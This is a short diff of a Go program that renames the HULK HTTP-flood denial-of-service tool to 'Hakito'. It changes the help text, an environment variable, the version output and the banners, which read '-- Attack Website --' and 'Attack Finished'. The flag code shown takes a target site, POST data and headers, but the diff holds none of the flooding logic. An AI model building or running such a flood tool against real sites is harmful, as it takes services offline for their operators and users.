@@ -7493,11 +7493,11 @@ func main() {
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
-	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.StringVar(&data, "data", "", "Data to POST. If present hakito will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
-	t := os.Getenv("HULKMAXPROCS")
+	t := os.Getenv("HAKITOMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
 		maxproc = 10804
@@ -7510,7 +7510,7 @@ func main() {
 	}
 
 	if version {
-		fmt.Println("Hulk", __version__)
+		fmt.Println("Hakito", __version__)
 		os.Exit(0)
 	}
 
@@ -7530,7 +7530,7 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- Attack Website --\n           Hulk4\n\n")
+		fmt.Println("-- Attack Website --\n           HAKITO4\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
@@ -7555,7 +7555,7 @@ func main() {
 			case targetComplete:
 				sent++
 				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				fmt.Println("\r-- HAKITO Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
 		}
